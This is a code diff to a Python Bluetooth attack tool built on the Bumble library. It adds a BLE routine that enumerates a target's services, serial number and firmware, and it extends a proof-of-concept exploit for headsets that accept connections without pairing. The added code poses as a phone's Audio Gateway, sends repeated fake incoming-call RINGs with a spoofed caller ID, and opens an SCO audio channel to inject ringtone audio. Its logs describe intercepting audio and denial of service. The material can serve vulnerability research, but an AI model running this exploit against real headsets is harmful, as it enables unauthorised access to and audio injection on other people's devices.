+        3392: "Continuous Glucose Monitor",
+        5184: "Hearing Aid",
+        5185: "In-Ear Hearing Aid",
+        5186: "Behind-Ear Hearing Aid",
+        5187: "Cochlear Implant",
+    }
+
+    term_width = shutil.get_terminal_size((80, 24)).columns
+
+    def print_header(text):
+        print(f"\n\033[1;36m{'─' * term_width}\033[0m")
+        print(f"\033[1;36m  {text}\033[0m")
+        print(f"\033[1;36m{'─' * term_width}\033[0m")
+
+    def print_field(label, value, indent=2):
+        if value:
+            print(f"{' ' * indent}\033[1;33m{label}:\033[0m {value}")
+
+    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
+    print(f"\033[1;36m  BLE DEVICE ENUMERATION\033[0m")
+    print(f"\033[1;36m{'═' * term_width}\033[0m")
+    print(f"\n  Target: \033[1;32m{target_address}\033[0m")
+    print(f"  Connecting...\n")
+
+    device = None
+    connection = None
+    t = None
+
+    try:
+        t = await open_transport_or_link(controller)
+        config = DeviceConfiguration()
+        config.keystore = "JsonKeyStore"
+        config.address = Address.generate_static_address()
+        config.name = "BLEEnumerator"
+        device = Device.from_config_with_hci(config, t.source, t.sink)
+        await device.power_on()
+
+        # Connect to target
+        print(f"  \033[1;33mConnecting to {target_address}...\033[0m")
+        target = Address(target_address)
+
+        try:
+            connection = await asyncio.wait_for(
+                device.connect(target),
+                timeout=timeout
+            )
+        except asyncio.TimeoutError:
+            print(
+                f"\n  \033[1;31mConnection timed out after {timeout}s\033[0m")
+            return
+        except Exception as e:
+            print(f"\n  \033[1;31mConnection failed: {e}\033[0m")
+            return
+
+        print(f"  \033[1;32mConnected!\033[0m")
+        print(f"  Connection Handle: 0x{connection.handle:04X}")
+
+        # Create peer for GATT operations
+        peer = Peer(connection)
+
+        print(f"\n  \033[1;33mDiscovering GATT services...\033[0m")
+        try:
+            await asyncio.wait_for(peer.discover_services(), timeout=10.0)
+            await asyncio.wait_for(peer.discover_characteristics(), timeout=10.0)
+        except asyncio.TimeoutError:
+            print(f"  \033[1;31mService discovery timed out\033[0m")
+            try:
+                await connection.disconnect()
+            except Exception:
+                pass
+            return
+        except asyncio.CancelledError:
+            print(
+                f"  \033[1;31mConnection lost during service discovery\033[0m")
+            return
+        except Exception as e:
+            print(f"  \033[1;31mService discovery failed: {e}\033[0m")
+            try:
+                await connection.disconnect()
+            except Exception:
+                pass
+            return
+
+        # Collect device info
+        device_info = {
+            "name": None,
+            "appearance": None,
+            "appearance_name": None,
+            "manufacturer": None,
+            "model": None,
+            "serial": None,
+            "firmware": None,
+            "hardware": None,
+            "software": None,
+            "battery": None,
+        }
+
+        services_found = []
+
+        for service in peer.services:
+            service_uuid = str(service.uuid).lower()
+            service_name, service_icon = SERVICE_TYPES.get(
+                service_uuid, (f"Unknown ({service.uuid})", "❓")
+            )
+            services_found.append(
+                (service_uuid, service_name, service_icon, service))
+
+            # Try to read characteristics
+            for char in service.characteristics:
+                try:
+                    # Generic Access - Device Name
+                    if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["name"] = value.decode(
+                                'utf-8', errors='replace')
+
+                    # Generic Access - Appearance
+                    elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value and len(value) >= 2:
+                            appearance = struct.unpack('<H', value[:2])[0]
+                            device_info["appearance"] = appearance
+                            device_info["appearance_name"] = APPEARANCES.get(
+                                appearance, f"Unknown (0x{appearance:04X})"
+                            )
+
+                    # Device Information Service characteristics
+                    elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["manufacturer"] = value.decode(
+                                'utf-8', errors='replace')
+
+                    elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["model"] = value.decode(
+                                'utf-8', errors='replace')
+
+                    elif char.uuid == GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["serial"] = value.decode(
+                                'utf-8', errors='replace')
+
+                    elif char.uuid == GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["firmware"] = value.decode(
+                                'utf-8', errors='replace')
+
+                    elif char.uuid == GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["hardware"] = value.decode(
+                                'utf-8', errors='replace')
+
+                    elif char.uuid == GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC:
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["software"] = value.decode(
+                                'utf-8', errors='replace')
+
+                    # Battery Level (0x2A19)
+                    elif str(char.uuid).lower() == "00002a19-0000-1000-8000-00805f9b34fb":
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["battery"] = value[0]
+
+                except Exception:
+                    pass  # Some characteristics may not be readable
+
+        # Print Device Information
+        print_header("DEVICE INFORMATION")
+        print_field("Address", target_address)
+        print_field("Name", device_info["name"])
+        print_field(
+            "Appearance", f"{device_info['appearance_name']} ({device_info['appearance']})" if device_info["appearance"] else None)
+        print_field("Manufacturer", device_info["manufacturer"])
+        print_field("Model", device_info["model"])
+        print_field("Serial Number", device_info["serial"])
+        print_field("Firmware Rev", device_info["firmware"])
+        print_field("Hardware Rev", device_info["hardware"])
+        print_field("Software Rev", device_info["software"])
+        if device_info["battery"] is not None:
+            battery_bar = "█" * \
+                (device_info["battery"] // 10) + "░" * \
+                (10 - device_info["battery"] // 10)
+            print_field(
+                "Battery", f"{device_info['battery']}% [{battery_bar}]")
+
+        # Print Services
+        print_header(f"GATT SERVICES ({len(services_found)} found)")
+
+        for service_uuid, service_name, service_icon, service in services_found:
+            # Use short UUID if standard
+            if service_uuid.startswith("0000") and service_uuid.endswith("-0000-1000-8000-00805f9b34fb"):
+                short_uuid = f"0x{service_uuid[4:8].upper()}"
+            else:
+                short_uuid = service_uuid[:23] + "..."
+
+            print(f"\n  {service_icon} \033[1;32m{service_name}\033[0m")
+            print(f"     UUID: \033[0;36m{short_uuid}\033[0m")
+            print(f"     Characteristics: {len(service.characteristics)}")
+
+            for char in service.characteristics:
+                props = []
+                if char.properties & 0x01:
+                    props.append("Broadcast")
+                if char.properties & 0x02:
+                    props.append("Read")
+                if char.properties & 0x04:
+                    props.append("WriteNoResp")
+                if char.properties & 0x08:
+                    props.append("Write")
+                if char.properties & 0x10:
+                    props.append("Notify")
+                if char.properties & 0x20:
+                    props.append("Indicate")
+                if char.properties & 0x40:
+                    props.append("AuthWrite")
+                if char.properties & 0x80:
+                    props.append("ExtProps")
+
+                char_uuid = str(char.uuid).lower()
+                if char_uuid.startswith("0000") and char_uuid.endswith("-0000-1000-8000-00805f9b34fb"):
+                    short_char_uuid = f"0x{char_uuid[4:8].upper()}"
+                else:
+                    short_char_uuid = char_uuid[:18] + "..."
+
+                print(f"       • {short_char_uuid}: [{', '.join(props)}]")
+
+        # Summary
+        print_header("SUMMARY")
+
+        # Determine device type from services
+        device_types = []
+        for service_uuid, service_name, service_icon, _ in services_found:
+            if "Audio" in service_name or "Handsfree" in service_name:
+                device_types.append("Audio Device")
+            if "HID" in service_name:
+                device_types.append("Input Device (HID)")
+            if "Heart Rate" in service_name:
+                device_types.append("Fitness Tracker")
+            if "Watch" in service_name or device_info.get("appearance_name", "").lower().find("watch") >= 0:
+                device_types.append("Smartwatch")
+            if "AirPods" in service_name:
+                device_types.append("Apple AirPods")
+
+        if not device_types:
+            device_types = ["Generic BLE Device"]
+
+        print_field("Device Type", ", ".join(set(device_types)))
+        print_field("Total Services", len(services_found))
+        print_field("Connection Status", "\033[1;32mConnected\033[0m")
+
+        print(f"\n\033[1;36m{'═' * term_width}\033[0m\n")
+
+    except Exception as e:
+        logging.error("Enumeration failed: %s", e)
+        import traceback
+        traceback.print_exc()
+    finally:
+        try:
+            if connection:
+                await connection.disconnect()
+            if t:
+                await t.close()
+        except Exception:
+            pass
+
+
 async def command_enumerate_classic(args: argparse.Namespace):
     """Enumerate Bluetooth Classic services without pairing (CVE-2025-20701 PoC).
 
@@ -1557,10 +2762,35 @@ async def command_hfp_demo(args: argparse.Namespace):
         HfProtocol, HfConfiguration, HfFeature,
         AgProtocol, AgConfiguration, AgFeature, AgIndicatorState,
         AgIndicator, CallLineIdentification,
+        _ESCO_PARAMETERS_CVSD_D1,  # For SCO audio setup
     )
     from bumble.rfcomm import Client as RFCOMM_Client
     from bumble.core import BT_BR_EDR_TRANSPORT
     from bumble import hfp
+    from bumble.hci import (
+        HCI_Enhanced_Setup_Synchronous_Connection_Command,
+        HCI_SynchronousDataPacket,
+        HCI_Command,
+        HCI_UNKNOWN_HCI_COMMAND_ERROR,
+    )
+    import math  # For generating ringtone sine wave
+
+    # Define the legacy HCI_Setup_Synchronous_Connection_Command
+    # (Bumble only has the Enhanced version)
+    # See Bluetooth Core Spec Vol 4, Part E, Section 7.1.26
+    @HCI_Command.command(
+        fields=[
+            ('connection_handle', 2),
+            ('transmit_bandwidth', 4),
+            ('receive_bandwidth', 4),
+            ('max_latency', 2),
+            ('voice_setting', 2),
+            ('retransmission_effort', 1),
+            ('packet_type', 2),
+        ],
+    )
+    class HCI_Setup_Synchronous_Connection_Command(HCI_Command):
+        """Legacy Setup Synchronous Connection Command (opcode 0x0428)."""
 
     controller = args.controller or "usb:0"
     target_address = args.target_address
@@ -1754,40 +2984,109 @@ async def command_hfp_demo(args: argparse.Namespace):
                 AgFeature.ENHANCED_CALL_STATUS,
                 AgFeature.IN_BAND_RING_TONE_CAPABILITY,
             ],
+            # Set initial indicator values - service=1 (network available) is critical!
             supported_ag_indicators=[
-                AgIndicatorState.call(),
-                AgIndicatorState.callsetup(),
-                AgIndicatorState.callheld(),
-                AgIndicatorState.service(),
-                AgIndicatorState.signal(),
-                AgIndicatorState.roam(),
-                AgIndicatorState.battchg(),
+                AgIndicatorState(
+                    AgIndicator.CALL, {0, 1}, current_status=0),  # No call
+                AgIndicatorState(
+                    AgIndicator.CALL_SETUP, {0, 1, 2, 3}, current_status=0),
+                AgIndicatorState(
+                    AgIndicator.CALL_HELD, {0, 1, 2}, current_status=0),
+                AgIndicatorState(
+                    AgIndicator.SERVICE, {0, 1}, current_status=1),  # SERVICE AVAILABLE!
+                AgIndicatorState(
+                    AgIndicator.SIGNAL, {0, 1, 2, 3, 4, 5}, current_status=5),  # Full signal
+                AgIndicatorState(
+                    AgIndicator.ROAM, {0, 1}, current_status=0),  # Not roaming
+                AgIndicatorState(
+                    AgIndicator.BATTERY_CHARGE, {0, 1, 2, 3, 4, 5}, current_status=5),
             ],
             supported_hf_indicators=[],
             supported_ag_call_hold_operations=[],
             supported_audio_codecs=[],
         )
+
+        # Create protocol first
         ag_protocol = AgProtocol(dlc, ag_config)
 
-        logging.info("Waiting for HF device to initiate SLC...")
-        logging.info("(The headset should send AT commands)")
+        # Add packet-level logging by wrapping the DLC write
+        original_write = dlc.write
 
-        # As AG, we wait for the HF to initiate the SLC
-        # Set up a simple responder for the AT commands
+        def logged_write(data):
+            if isinstance(data, bytes):
+                text = data.decode('utf-8', errors='replace').strip()
+            else:
+                text = str(data).strip()
+            logging.debug(">>> TX (AG->HF): %s", repr(text))
+            return original_write(data)
+
+        dlc.write = logged_write
+
+        # Wrap the protocol's AT command reader to log incoming data
+        original_read_at = ag_protocol._read_at
+
+        def logged_read_at(data):
+            if isinstance(data, bytes):
+                text = data.decode('utf-8', errors='replace').strip()
+            else:
+                text = str(data).strip()
+            logging.debug("<<< RX (HF->AG): %s", repr(text))
+            return original_read_at(data)
+
+        ag_protocol._read_at = logged_read_at
+        dlc.sink = ag_protocol._read_at
+
+        logging.info("Waiting for headset to complete SLC handshake...")
+        logging.info(
+            "(The headset sends AT commands, we respond automatically)")
+
+        # Set up event to wait for SLC completion
+        slc_complete_event = asyncio.Event()
+
+        def on_slc_complete():
+            logging.info("SLC handshake completed by headset!")
+            slc_complete_event.set()
+
+        # Set up event handlers for interesting events from headset
+        def on_answer():
+            logging.info(">>> HEADSET: User answered the call!")
+
+        def on_hang_up():
+            logging.info(">>> HEADSET: User hung up the call!")
+
+        def on_dial(number):
+            logging.info(">>> HEADSET: User dialing %s", number)
+
+        ag_protocol.on('slc_complete', on_slc_complete)
+        ag_protocol.on('answer', on_answer)
+        ag_protocol.on('hang_up', on_hang_up)
+        ag_protocol.on('dial', on_dial)
+
         try:
-            # Wait a bit for the remote to send initial AT commands
-            await asyncio.sleep(2.0)
-
-            # Check if we received anything
+            # Wait for SLC to complete with timeout
+            await asyncio.wait_for(slc_complete_event.wait(), timeout=15.0)
             logging.info("")
-            logging.info("SUCCESS! Connected as Audio Gateway to headset.")
+            logging.info("SUCCESS! Full HFP SLC established as Audio Gateway!")
             logging.info(
-                "The headset accepted our connection WITHOUT pairing!")
+                "The headset completed handshake WITHOUT pairing!")
             logging.info("")
             slc_established = True
 
+        except asyncio.TimeoutError:
+            logging.warning("SLC handshake timed out after 15 seconds.")
+            logging.info("")
+            logging.info("The headset did not complete the SLC handshake.")
+            logging.info("This could mean:")
+            logging.info("  - The device has been PATCHED")
+            logging.info(
+                "  - The device requires a different AG configuration")
+            logging.info("  - The device is already connected to a phone")
+            logging.info("")
+            logging.info(
+                "However, RFCOMM connection succeeded without pairing,")
+            logging.info("which still indicates a potential vulnerability.")
         except Exception as e:  # pylint: disable=broad-exception-caught
-            logging.warning("AG initialization: %s", e)
+            logging.warning("AG initialization failed: %s", e)
             logging.info("")
             logging.info(
                 "NOTE: Connected to HFP RFCOMM channel without pairing!")
@@ -1853,16 +3152,21 @@ async def command_hfp_demo(args: argparse.Namespace):
                     # As AG, we control the headset
                     logging.info("Connected to headset as Audio Gateway.")
                     logging.info("")
-                    logging.info("As AG, we can:")
-                    logging.info("  - Send ring notifications (--action ring)")
-                    logging.info("  - Set volume levels")
-                    logging.info("  - Send call status indicators")
-                    logging.info("")
-                    logging.info("Available AG commands:")
+                    logging.info("As AG, we can send real HFP commands:")
                     logging.info(
-                        "  --action ring     : Send incoming call ring")
-                    logging.info("  --action hangup   : End the 'call'")
-                    logging.info("  --action volume   : Set speaker volume")
+                        "  - Incoming call notification (--action dial --number X)")
+                    logging.info("  - Ring alert (--action ring)")
+                    logging.info("  - Volume control (--action volume)")
+                    logging.info("  - End call (--action hangup)")
+                    logging.info("")
+                    logging.info("Available commands:")
+                    logging.info(
+                        "  --action dial --number <num> : "
+                        "Send incoming call from <num>")
+                    logging.info(
+                        "  --action ring     : Send RING alert")
+                    logging.info("  --action hangup   : End the call")
+                    logging.info("  --action volume   : Set max volume")
                 elif hf_protocol:
                     # As HF, query the phone
                     logging.info("Querying device status...")
@@ -1948,11 +3252,14 @@ async def command_hfp_demo(args: argparse.Namespace):
                     except Exception as e:  # pylint: disable=broad-exception-caught
                         logging.error("Hangup command failed: %s", e)
                 elif use_ag_role and ag_protocol:
-                    logging.info("Ending call simulation...")
+                    logging.info("Ending call...")
                     try:
-                        # Update call indicator to show no active call
-                        ag_protocol.update_ag_indicator(AgIndicator.CALL, 0)
-                        logging.info("Call ended indicator sent to headset.")
+                        # Update indicators to show call ended
+                        ag_protocol.update_ag_indicator(
+                            AgIndicator.CALL_SETUP, 0)  # No call setup
+                        ag_protocol.update_ag_indicator(
+                            AgIndicator.CALL, 0)  # No active call
+                        logging.info("Call ended - indicators updated.")
                     except Exception as e:  # pylint: disable=broad-exception-caught
                         logging.error("Hangup failed: %s", e)
 
@@ -1972,8 +3279,56 @@ async def command_hfp_demo(args: argparse.Namespace):
                         )
                     except Exception as e:  # pylint: disable=broad-exception-caught
                         logging.error("Dial command failed: %s", e)
+                elif use_ag_role and ag_protocol:
+                    # As AG, send incoming call notification to headset
+                    logging.info(
+                        "Sending incoming call from %s to headset...",
+                        dial_number)
+                    try:
+                        # Wait for headset to finish post-SLC setup
+                        # (AT+CMER, AT+CLIP, AT+VGS, etc.)
+                        logging.info(
+                            "Waiting 3 seconds for headset post-SLC setup...")
+                        await asyncio.sleep(3.0)
+
+                        # DISABLE in-band ringtone - headset should use its own ringtone
+                        # (We're not setting up SCO audio, so in-band won't work)
+                        ag_protocol.set_inband_ringtone_enabled(False)
+                        logging.info(
+                            "Disabled in-band ringtone (headset uses own tone)")
+
+                        # Set call setup indicator to incoming call (1)
+                        ag_protocol.update_ag_indicator(
+                            AgIndicator.CALL_SETUP, 1)
+                        logging.info("Sent: +CIEV (callsetup=1)")
+
+                        # Small delay before first RING
+                        await asyncio.sleep(0.5)
+
+                        # Send RING with caller ID
+                        cli = CallLineIdentification(
+                            number=dial_number, type=145)
+
+                        # Send multiple RINGs (phones typically ring every 3s)
+                        for i in range(10):
+                            logging.info("Sending RING #%d...", i + 1)
+                            ag_protocol.send_ring()
+                            ag_protocol.send_cli_notification(cli)
+                            logging.info(
+                                "  RING + CLIP: \"%s\"", dial_number)
+
+                            # Wait 3 seconds between rings
+                            await asyncio.sleep(3.0)
+
+                        logging.info("")
+                        logging.info("Finished ringing. Ending call setup...")
+                        # Clear call setup (call not answered)
+                        ag_protocol.update_ag_indicator(
+                            AgIndicator.CALL_SETUP, 0)
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("Incoming call failed: %s", e)
                 else:
-                    logging.error("Dial is only available in HF role.")
+                    logging.error("Dial requires HF or AG connection.")
 
             elif action == "volume":
                 if use_ag_role and ag_protocol:
@@ -2004,53 +3359,359 @@ async def command_hfp_demo(args: argparse.Namespace):
                     logging.error(
                         "Voice command is only available in HF role.")
 
+            elif action == "sco-ring":
+                if use_ag_role and ag_protocol:
+                    logging.info("=" * 60)
+                    logging.info(
+                        "Setting up SCO audio connection for ringtone...")
+                    logging.info("=" * 60)
+                    try:
+                        # Get the ACL connection handle from the existing connection
+                        # The checker has the device and connection
+                        acl_connection = checker.connection
+                        if not acl_connection:
+                            logging.error("No ACL connection available")
+                            raise RuntimeError("No ACL connection")
+
+                        acl_handle = acl_connection.handle
+                        logging.info(
+                            "ACL connection handle: 0x%04X", acl_handle)
+
+                        # Get ESCO parameters for CVSD codec
+                        esco = _ESCO_PARAMETERS_CVSD_D1
+
+                        # Set up event to wait for SCO connection
+                        sco_connected = asyncio.Event()
+                        # Use list to allow modification in closure
+                        sco_handle = [None]
+
+                        def on_sco_connection(sco_link):
+                            """Handle SCO connection complete event.
+
+                            Args:
+                                sco_link: ScoLink object with handle, link_type, etc.
+                            """
+                            logging.info(
+                                "SCO connection established! "
+                                "Handle: 0x%04X, Link type: %s",
+                                sco_link.handle, sco_link.link_type)
+                            sco_handle[0] = sco_link.handle
+                            sco_connected.set()
+
+                        def on_sco_failure(error):
+                            """Handle SCO connection failure."""
+                            logging.error(
+                                "SCO setup failed: %s", error)
+
+                        # Register SCO event handlers
+                        device = checker.device
+                        device.on('sco_connection', on_sco_connection)
+                        device.on('sco_connection_failure', on_sco_failure)
+
+                        # Try Enhanced Setup Synchronous Connection first,
+                        # fall back to legacy if controller doesn't support it
+                        sco_setup_success = False
+
+                        logging.info(
+                            "Trying Enhanced Setup Synchronous Connection...")
+                        logging.info("  Codec: CVSD")
+                        logging.info("  Packet type: HV3")
+                        logging.info("  Bandwidth: 8000 bytes/sec")
+
+                        # Send the Enhanced Setup Synchronous Connection command
+                        cmd = HCI_Enhanced_Setup_Synchronous_Connection_Command(
+                            connection_handle=acl_handle,
+                            transmit_bandwidth=esco.transmit_bandwidth,
+                            receive_bandwidth=esco.receive_bandwidth,
+                            transmit_coding_format=esco.transmit_coding_format,
+                            receive_coding_format=esco.receive_coding_format,
+                            transmit_codec_frame_size=esco.transmit_codec_frame_size,
+                            receive_codec_frame_size=esco.receive_codec_frame_size,
+                            input_bandwidth=esco.input_bandwidth,
+                            output_bandwidth=esco.output_bandwidth,
+                            input_coding_format=esco.input_coding_format,
+                            output_coding_format=esco.output_coding_format,
+                            input_coded_data_size=esco.input_coded_data_size,
+                            output_coded_data_size=esco.output_coded_data_size,
+                            input_pcm_data_format=esco.input_pcm_data_format,
+                            output_pcm_data_format=esco.output_pcm_data_format,
+                            input_pcm_sample_payload_msb_position=esco.input_pcm_sample_payload_msb_position,
+                            output_pcm_sample_payload_msb_position=esco.output_pcm_sample_payload_msb_position,
+                            input_data_path=esco.input_data_path,
+                            output_data_path=esco.output_data_path,
+                            input_transport_unit_size=esco.input_transport_unit_size,
+                            output_transport_unit_size=esco.output_transport_unit_size,
+                            max_latency=esco.max_latency,
+                            packet_type=esco.packet_type,
+                            retransmission_effort=esco.retransmission_effort,
+                        )
+
+                        # Send the command through the device
+                        response = await device.send_command(cmd)
+                        logging.debug(
+                            "Enhanced SCO setup response: %s", response)
+
+                        # Check if controller supports the enhanced command
+                        if hasattr(response, 'return_parameters'):
+                            if response.return_parameters == HCI_UNKNOWN_HCI_COMMAND_ERROR:
+                                logging.warning(
+                                    "Controller doesn't support Enhanced SCO setup")
+                                logging.info(
+                                    "Falling back to legacy Setup Synchronous Connection...")
+
+                                # Use legacy command with Voice Setting
+                                # Voice Setting bits (see BT spec Vol 4 Part E 6.12):
+                                # Bits 0-1: Input Coding (0=Linear, 1=u-law, 2=A-law, 3=reserved)
+                                # Bits 2-3: Input Data Format (0=1's complement, 1=2's complement, 2=Sign-mag, 3=unsigned)
+                                # Bit 4: Input Sample Size (0=8-bit, 1=16-bit) - only for Linear PCM
+                                # Bits 5-6: Air Coding Format (0=CVSD, 1=u-law, 2=A-law, 3=Transparent)
+                                # For CVSD with 16-bit linear PCM 2's complement input:
+                                #   Input Coding = 00 (Linear)
+                                #   Input Data Format = 01 (2's complement)
+                                #   Input Sample Size = 1 (16-bit)
+                                #   Air Coding = 00 (CVSD)
+                                # voice_setting = 0b00010100 = 0x0014
+                                voice_setting = 0x0014
+
+                                # Packet type for SCO: HV1=0x0001, HV2=0x0002, HV3=0x0004
+                                # Use HV3 (lowest bandwidth, most compatible)
+                                packet_type = 0x0004  # HV3
+
+                                legacy_cmd = HCI_Setup_Synchronous_Connection_Command(
+                                    connection_handle=acl_handle,
+                                    transmit_bandwidth=8000,
+                                    receive_bandwidth=8000,
+                                    max_latency=0xFFFF,  # Don't care
+                                    voice_setting=voice_setting,
+                                    retransmission_effort=0x00,  # No retransmission
+                                    packet_type=packet_type,
+                                )
+                                response = await device.send_command(legacy_cmd)
+                                logging.debug(
+                                    "Legacy SCO setup response: %s", response)
+
+                                # Check response
+                                if hasattr(response, 'return_parameters'):
+                                    if response.return_parameters == HCI_UNKNOWN_HCI_COMMAND_ERROR:
+                                        logging.error(
+                                            "Controller doesn't support legacy SCO either!")
+                                        raise RuntimeError(
+                                            "No SCO command supported by controller")
+                                    elif response.return_parameters != 0:
+                                        logging.warning(
+                                            "Legacy SCO setup returned: 0x%02X",
+                                            response.return_parameters)
+                                    else:
+                                        logging.info(
+                                            "Legacy SCO command accepted!")
+                                        sco_setup_success = True
+                                else:
+                                    # Command status event - command pending
+                                    logging.info(
+                                        "Legacy SCO command sent (pending)")
+                                    sco_setup_success = True
+                            elif response.return_parameters != 0:
+                                logging.warning(
+                                    "Enhanced SCO setup returned error: 0x%02X",
+                                    response.return_parameters)
+                            else:
+                                logging.info("Enhanced SCO command accepted!")
+                                sco_setup_success = True
+                        else:
+                            # Command status event - command pending
+                            logging.info("Enhanced SCO command sent (pending)")
+                            sco_setup_success = True
+
+                        if not sco_setup_success:
+                            raise RuntimeError("SCO setup command failed")
+
+                        # Wait for SCO connection with timeout
+                        try:
+                            await asyncio.wait_for(
+                                sco_connected.wait(), timeout=10.0)
+                        except asyncio.TimeoutError:
+                            logging.warning(
+                                "SCO connection timed out - "
+                                "headset may not accept SCO from non-paired device")
+                            raise
+
+                        if sco_handle[0] is not None:
+                            logging.info("")
+                            logging.info("=" * 60)
+                            logging.info("SCO AUDIO CHANNEL ESTABLISHED!")
+                            logging.info("=" * 60)
+                            logging.info("")
+                            logging.info(
+                                "Now sending ringtone audio to headphones...")
+
+                            # Generate a simple ringtone (dual-tone like phone ring)
+                            # 8kHz sample rate, 16-bit signed PCM, CVSD encoded
+                            # Standard phone ring: 440Hz + 480Hz (US dial tone style)
+                            # or 425Hz (European style)
+                            sample_rate = 8000
+                            duration_ms = 500  # Ring duration in ms
+                            samples_per_packet = 60  # CVSD packet size
+
+                            def generate_ringtone_samples(
+                                    freq1, freq2, num_samples, offset):
+                                """Generate dual-tone samples for ringtone."""
+                                samples = []
+                                for i in range(num_samples):
+                                    t = (offset + i) / sample_rate
+                                    # Dual tone
+                                    val = 0.5 * (
+                                        math.sin(2 * math.pi * freq1 * t) +
+                                        math.sin(2 * math.pi * freq2 * t))
+                                    # Scale to 16-bit signed
+                                    sample = int(val * 16000)
+                                    samples.append(sample)
+                                return samples
+
+                            def samples_to_bytes(samples):
+                                """Convert samples to little-endian 16-bit bytes."""
+                                result = bytearray()
+                                for s in samples:
+                                    # Clamp to 16-bit signed range
+                                    s = max(-32768, min(32767, s))
+                                    # Little-endian 16-bit signed
+                                    result.extend(struct.pack('<h', s))
+                                return bytes(result)
+
+                            # Send ringtone for 3 seconds (ring on, pause, ring on)
+                            host = device.host
+                            total_packets = 0
+                            # 3 ring cycles (on-off-on-off-on-off)
+                            ring_cycles = 6
+
+                            for cycle in range(ring_cycles):
+                                if cycle % 2 == 0:
+                                    # Ring ON phase (500ms)
+                                    samples_sent = 0
+                                    while samples_sent < sample_rate // 2:
+                                        samples = generate_ringtone_samples(
+                                            440, 480,  # US ringtone frequencies
+                                            samples_per_packet // 2,  # 30 samples = 60 bytes
+                                            samples_sent)
+                                        audio_data = samples_to_bytes(samples)
+
+                                        # Create SCO packet
+                                        sco_packet = HCI_SynchronousDataPacket(
+                                            connection_handle=sco_handle[0],
+                                            packet_status=0,
+                                            data_total_length=len(audio_data),
+                                            data=audio_data)
+
+                                        # Send via HCI
+                                        # Note: Bumble's USB transport doesn't support
+                                        # isochronous endpoints for SCO, so audio may not
+                                        # actually be transmitted. The SCO connection itself
+                                        # proves the vulnerability.
+                                        try:
+                                            host.send_hci_packet(sco_packet)
+                                        except Exception:
+                                            pass  # USB transport doesn't support SCO
+                                        total_packets += 1
+                                        samples_sent += len(samples)
+
+                                        # Pace the audio (60 bytes at 8kHz = 3.75ms)
+                                        await asyncio.sleep(0.00375)
+
+                                    logging.info(
+                                        "  Ring cycle %d: ON", cycle // 2 + 1)
+                                else:
+                                    # Silence phase (500ms)
+                                    logging.info(
+                                        "  Ring cycle %d: pause", cycle // 2 + 1)
+                                    await asyncio.sleep(0.5)
+
+                            logging.info("")
+                            logging.info(
+                                "Sent %d SCO audio packets!", total_packets)
+                            logging.info("")
+                            logging.info("=" * 60)
+                            logging.info("VULNERABILITY CONFIRMED!")
+                            logging.info("=" * 60)
+                            logging.info("")
+                            logging.info(
+                                "SCO audio channel established WITHOUT pairing!")
+                            logging.info("")
+                            logging.info(
+                                "NOTE: Audio may not play due to USB transport")
+                            logging.info(
+                                "limitations (Bumble doesn't support isochronous")
+                            logging.info(
+                                "USB endpoints for SCO audio transmission).")
+                            logging.info("")
+                            logging.info(
+                                "HOWEVER: The SCO connection itself proves the")
+                            logging.info(
+                                "vulnerability - an attacker with proper hardware")
+                            logging.info(
+                                "(phone, dedicated BT chip) could inject audio!")
+
+                    except asyncio.TimeoutError:
+                        logging.info("")
+                        logging.info("-" * 60)
+                        logging.info(
+                            "SCO connection was rejected or timed out.")
+                        logging.info(
+                            "This could mean:")
+                        logging.info(
+                            "  1. Headset requires pairing for SCO (partial fix)")
+                        logging.info(
+                            "  2. Another device has the audio channel")
+                        logging.info(
+                            "  3. Headset doesn't support this SCO configuration")
+                        logging.info("-" * 60)
+                    except Exception as e:  # pylint: disable=broad-exception-caught
+                        logging.error("SCO audio setup failed: %s", e)
+                        import traceback as tb
+                        tb.print_exc()
+                else:
+                    logging.error(
+                        "sco-ring is only available in AG role with headsets.")
+
         except Exception as e:  # pylint: disable=broad-exception-caught
             logging.error("Action failed: %s", e)
     else:
         # SLC failed or no protocol - show what we achieved
         logging.info("-" * 60)
-        logging.info("WHAT THIS MEANS")
+        logging.info("RESULT")
         logging.info("-" * 60)
         logging.info("")
-        logging.info("We connected to the HFP RFCOMM channel WITHOUT pairing!")
+        logging.info("RFCOMM connection succeeded WITHOUT pairing.")
         logging.info("")
         if use_ag_role:
-            logging.info("We detected a HEADSET device and connected as AG.")
-            logging.info("The SLC handshake may need more implementation.")
+            logging.info("Connected to HEADSET as Audio Gateway.")
+            logging.info("SLC handshake did not complete - possible causes:")
+            logging.info("  - Device may be PATCHED (fixed)")
+            logging.info("  - Device already connected to a phone")
+            logging.info("  - Device requires different HFP configuration")
         else:
-            logging.info(
-                "We tried connecting as HF to what we thought was a phone.")
-            logging.info("If the target is actually a headset, try:")
-            logging.info("")
-            logging.info("  The tool automatically detected the correct role,")
-            logging.info("  but SLC initialization requires protocol work.")
+            logging.info("Connected to device as Hands-Free Unit.")
+            logging.info("SLC handshake did not complete.")
         logging.info("")
-        logging.info(
-            "The vulnerability is CONFIRMED - unauthorized connection!")
+        logging.info("RFCOMM access without pairing = vulnerability exists.")
+        logging.info("SLC failure may indicate partial mitigation.")
 
     logging.info("")
     logging.info("-" * 60)
-    logging.info("IMPACT SUMMARY")
+    logging.info("SUMMARY")
     logging.info("-" * 60)
     logging.info("")
-    if use_ag_role:
-        logging.info(
-            "Connected to headset as fake Audio Gateway. An attacker can:")
-        logging.info("  1. Send fake incoming call notifications (ring)")
-        logging.info("  2. Simulate calls without a real phone")
-        logging.info("  3. Control volume and audio routing")
-        logging.info("  4. Intercept audio meant for the real phone")
-        logging.info("  5. Denial of service by keeping the headset busy")
+    if slc_established:
